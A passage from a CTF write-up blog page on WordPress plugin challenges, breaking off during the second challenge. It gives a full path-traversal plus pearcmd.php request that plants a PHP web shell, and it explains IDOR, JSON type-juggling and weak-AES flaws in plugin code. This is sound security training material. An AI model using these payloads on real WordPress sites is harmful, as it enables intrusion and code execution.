@@ -1,0 +1,1292 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Writeup for 7/10 CTF challenges from Patchstack S02E01 - WordCamp Asia CTF. All challenges were related to WordPress, so it's a good practice if you want to improve your WordPress security skills."><title>Patchstack S02E01 - WordCamp Asia CTF Writeup</title>
+<link rel=canonical href=https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="Patchstack S02E01 - WordCamp Asia CTF Writeup"><meta property='og:description' content="Writeup for 7/10 CTF challenges from Patchstack S02E01 - WordCamp Asia CTF. All challenges were related to WordPress, so it's a good practice if you want to improve your WordPress security skills."><meta property='og:url' content='https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/'><meta property='og:site_name' content='lordrukie'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2025-02-24T11:56:49+07:00'><meta property='article:modified_time' content='2025-02-24T13:44:48+00:00'><meta property='og:image' content='https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/ctf-asia.jpg'><meta name=twitter:title content="Patchstack S02E01 - WordCamp Asia CTF Writeup"><meta name=twitter:description content="Writeup for 7/10 CTF challenges from Patchstack S02E01 - WordCamp Asia CTF. All challenges were related to WordPress, so it's a good practice if you want to improve your WordPress security skills."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/ctf-asia.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu5923991180728147624.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>😼</span></figure><div class=site-meta><h1 class=site-name><a href=/>lordrukie</a></h1><h2 class=site-description>Cyber Security Consultant | CTF Player</h2></div></header><ol class=menu-social><li><a href=https://github.com/lordrukie target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/belugagemink target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/whoami/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>Whoami</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#intro>Intro</a></li><li><a href=#challenges>Challenges</a><ol><li><a href=#a-nice-block>A Nice Block</a></li><li><a href=#patchstack-scheduler-pro>Patchstack Scheduler Pro</a></li><li><a href=#sup3rcustomiz3r>Sup3rcustomiz3r</a></li><li><a href=#cool-templates>Cool Templates</a></li><li><a href=#blocked>Blocked</a></li><li><a href=#up-to-you>Up To You</a></li><li><a href=#give>Give</a></li></ol></li><li><a href=#outro>Outro</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/ctf-asia.jpg width=1920 height=1008 loading=lazy alt="Featured image of post Patchstack S02E01 - WordCamp Asia CTF Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/web/>Web
+</a><a href=/categories/ctf/>CTF
+</a><a href=/categories/wordpress/>Wordpress</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/>Patchstack S02E01 - WordCamp Asia CTF Writeup</a></h2><h3 class=article-subtitle>Writeup for 7/10 CTF challenges from Patchstack S02E01 - WordCamp Asia CTF. All challenges were related to WordPress, so it's a good practice if you want to improve your WordPress security skills.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Feb 24, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>24 minute read</time></div></footer></div></header><section class=article-content><h2 id=intro>Intro</h2><p>So i participated in Patchstack&rsquo;s third hosted CTF event, this time it&rsquo;s WordCamp Asia CTF. I managed to solve 7/10 challenges along the way and secured 3rd place in the leaderboard. The difficulty definitely harder than last patchstack CTF (in my opinion), but still fun. I learn a lot of cool tricks, specially in PHP and WordPress environment. Kudos to all problem setters, you guys did a great job 🔥🔥
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image.png width=1222 height=633 loading=lazy class=gallery-image data-flex-grow=193 data-flex-basis=463px></p><h2 id=challenges>Challenges</h2><p>Unfortunately, i&rsquo;m unable to solve all challenges. But let&rsquo;s see what im solve so far 😉</p><h3 id=a-nice-block>A Nice Block</h3><blockquote><p>I like the new Gutemberg editor, so I just installed a plugin with beautiful blocks addons. That&rsquo;s a great plugin that perfectly matches my design needs, I don&rsquo;t think it could cause a security issue, right?</p><p>This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).</p></blockquote><p>This is the easiest challenge (because it was the most solved challenge).</p><p>in the given source code, we can observe that it try to install <code>kiwiblocks</code> plugins.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-1.png width=784 height=278 loading=lazy class=gallery-image data-flex-grow=282 data-flex-basis=676px></p><p>The plugin itself already provided in the source code, so we can started by analyzing the plugin&rsquo;s code. One of the files that caught my eyes were panel.php
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-2.png width=721 height=580 loading=lazy class=gallery-image data-flex-grow=124 data-flex-basis=298px></p><p>it&rsquo;ll search for <code>tab</code> parameter, and then tries to include it without any proper sanitation. This approach is definitely unsafe and vulnerable to Path Traversal File Inclusions. This vuln can be used to load any files within the server.</p><p>Since it uses wordpress image from docker, then we can use <a class=link href=https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp target=_blank rel=noopener>pearcmd tricks</a> to gain code execution.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-3.png width=851 height=186 loading=lazy class=gallery-image data-flex-grow=457 data-flex-basis=1098px></p><p>This is due <code>register_argc_argv</code> is always enabled and php pear is always installed in wordpress docker image.</p><p>I sent a request to <code>/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?+config-create+/&amp;tab=../../../../../../../../../../../usr/local/lib/php/pearcmd.php&/&lt;?system($_GET[0])?>+/tmp/beluganothere.php</code> to upload a web shell within <code>tmp</code> directory.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-4.png width=1543 height=824 loading=lazy class=gallery-image data-flex-grow=187 data-flex-basis=449px></p><p>Then use the same vuln to access the uploaded file. We got the flag!
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-5.png width=1547 height=817 loading=lazy class=gallery-image data-flex-grow=189 data-flex-basis=454px></p><p><strong>Flag: CTF{TABBING_THE_TAB_0z933}</strong></p><hr><h3 id=patchstack-scheduler-pro>Patchstack Scheduler Pro</h3><blockquote><p>Patchstack needed to update their Blog content and asked a freelancer to make a plugin for scheduling their newest advisories. It has not been tested yet can you check it for us?</p></blockquote><p>In this challenge, we were given a custom plugins called <code>patchstack scheduler pro</code>. If take a look in <code>Makefile</code>, we can see that it tries to insert 50 <strong>draft</strong> random posts with one of them containing <code>ps_api_token</code>. Let&rsquo;s note this for later.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-6.png width=853 height=634 loading=lazy class=gallery-image data-flex-grow=134 data-flex-basis=322px></p><p>In the plugin index files, we can see that it registered several ajax actions. All of them have <code>nopriv</code> prefix, so it can be accessed from unauthenticated users.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;admin_menu&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;add_admin_menu&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;admin_enqueue_scripts&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;enqueue_admin_assets&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_nopriv_patchstack_scheduler_preview&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;handle_preview_request&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_patchstack_scheduler_preview&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;handle_preview_request&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_nopriv_patchstack_scheduler_compare&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;handle_compare_request&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_patchstack_scheduler_compare&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;handle_compare_request&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_nopriv_patchstack_scheduler_settings&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;handle_settings_request&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_patchstack_scheduler_settings&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;handle_settings_request&#39;</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s analyze each of the ajax actions. I&rsquo;ll started with <code>handle_preview_request</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>handle_preview_request</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$post_id</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;post_id&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>intval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;post_id&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$post</span> <span class=o>=</span> <span class=nx>get_post</span><span class=p>(</span><span class=nv>$post_id</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$post</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;Post not found&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nx>wp_send_json_success</span><span class=p>(</span><span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;content&#39;</span> <span class=o>=&gt;</span> <span class=nv>$post</span><span class=o>-&gt;</span><span class=na>post_content</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;title&#39;</span> <span class=o>=&gt;</span> <span class=nv>$post</span><span class=o>-&gt;</span><span class=na>post_title</span>
+</span></span><span class=line><span class=cl>    <span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>it will ask for <code>post_id</code> parameter, and then return post content if any. This action doesn&rsquo;t check for post status so we can read any post content in the site, even if the post status is draft or private.</p><p>For the second ajax <code>handle_compare_request</code>, we got following code</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>handle_compare_request</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$raw_data</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$content_type</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;CONTENT_TYPE&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;CONTENT_TYPE&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$content_type</span><span class=p>,</span> <span class=s1>&#39;application/json&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nv>$raw_data</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;api_token&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;api_token&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=nx>get_option</span><span class=p>(</span><span class=s1>&#39;ps_api_token&#39;</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;Invalid API token&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;encryption_key&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;encryption_key&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>encryption_key</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;Invalid encryption key&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;revision_data&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;revision_data&#39;</span><span class=p>][</span><span class=s1>&#39;post_status&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$status</span> <span class=o>=</span> <span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;revision_data&#39;</span><span class=p>][</span><span class=s1>&#39;post_status&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$status</span> <span class=o>===</span> <span class=s1>&#39;draft&#39;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$config</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>get_encrypted_config</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>            <span class=nx>wp_send_json_success</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;encrypted_config&#39;</span> <span class=o>=&gt;</span> <span class=nv>$config</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;Invalid revision data&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>It will try to read POST data as JSON, then perform several checks as follows:</p><ol><li>it will check if <code>api_token</code> is match with one in the wp options. Note that it uses strict comparasion <code>!==</code></li><li>try to check if <code>encryption_key</code> is same with value stored in the plugins. Note that it use loose comparasion <code>!=</code></li><li>try to check if <code>revision_data</code> is exists, and <code>revision_data.post_status</code> value is set to <code>draft</code></li></ol><p>If all criteria were met, then it will return encrypted config using <code>get_encryption_config</code> method.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>private</span> <span class=k>function</span> <span class=nf>get_encrypted_config</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$config</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;status&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;draft&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;permissions&#39;</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;view&#39;</span> <span class=o>=&gt;</span> <span class=k>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;edit&#39;</span> <span class=o>=&gt;</span> <span class=k>false</span>
+</span></span><span class=line><span class=cl>        <span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;encryption_key&#39;</span> <span class=o>=&gt;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>encryption_key</span>
+</span></span><span class=line><span class=cl>    <span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nv>$uuid</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>encryption_key</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$encrypted</span> <span class=o>=</span> <span class=nx>openssl_encrypt</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$config</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;AES-256-CBC&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$uuid</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$uuid</span>
+</span></span><span class=line><span class=cl>    <span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$uuid</span> <span class=o>.</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$encrypted</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>This method will encrypt the current plugin config with AES-256-CBC algorithm, but using the same value for both KEY & IV. It also append the plaintext IV into the base64 encoded data. So if we try to base64 decode, and then substract the first 16 character, then we&rsquo;ll get the KEY to decrypt the remaining data.</p><p>sounds great, right? but how can we fullfill the checking criteria described before?</p><p>for the first check, we can use IDOR within <code>handle_preview_request</code> to leak <code>api_token</code> from the draft post. We need to bruteforce a bit here since it was hidden within other 50 posts. In this case, i was able to found the correct post in id 36.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-7.png width=1547 height=590 loading=lazy class=gallery-image data-flex-grow=262 data-flex-basis=629px></p><p>Then how about <code>encryption_key</code>? we dont have any way to get the value of the key.. right? well, yes, but no.<br>we don&rsquo;t need to know the actual value of the <code>encryption_key</code> since it was using loose operator to compare. Since the POST is in JSON format, then we can use <code>true</code> as the value. This type of attack is well known as Type Juggling.<br><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-8.png width=354 height=68 loading=lazy class=gallery-image data-flex-grow=520 data-flex-basis=1249px></p><p>then we can craft the other value accordingly to get the encrypted config.
